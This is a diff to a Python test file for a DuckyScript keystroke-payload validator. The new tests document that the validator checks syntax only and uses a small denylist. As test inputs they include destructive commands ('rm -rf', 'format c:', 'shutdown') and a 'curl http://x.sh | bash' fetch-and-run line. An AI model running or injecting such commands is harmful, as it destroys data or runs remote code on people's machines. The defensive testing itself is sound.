@@ -49,10 +49,31 @@ def test_validate_duckyscript_invalid_syntax() -> None:
     assert validate_duckyscript("UNKNOWN_CMD 123") is False
 
 
-def test_validate_duckyscript_forbidden_pattern() -> None:
-    """Test rejection of destructive commands."""
+def test_validate_duckyscript_denylist_defense_in_depth() -> None:
+    """The small best-effort denylist still rejects its few known patterns."""
     assert validate_duckyscript("STRING rm -rf /\nENTER") is False
     assert validate_duckyscript("STRING format c:\nENTER") is False
+
+
+def test_validate_duckyscript_is_not_a_safety_filter() -> None:
+    """Documents that validation is syntax-only: destructive commands not in the
+    tiny denylist pass. Nobody should reuse this function as a safety gate."""
+    assert validate_duckyscript("STRING rm -rf ~\nENTER") is True
+    assert validate_duckyscript("STRING curl http://x.sh | bash\nENTER") is True
+    assert validate_duckyscript("STRING shutdown /s /t 0\nENTER") is True
+
+
+def test_default_payloads_are_non_destructive() -> None:
+    """Safety of the shipped library comes from curation, not from the validator:
+    every default payload is a read-only/diagnostic category and valid syntax."""
+    safe_categories = {
+        PayloadCategory.ADMIN,
+        PayloadCategory.NETWORK,
+        PayloadCategory.DEMO,
+    }
+    for payload in get_default_payloads():
+        assert payload.category in safe_categories
+        assert validate_duckyscript(payload.script_content) is True
 
 
 def test_export_payload_assets() -> None:
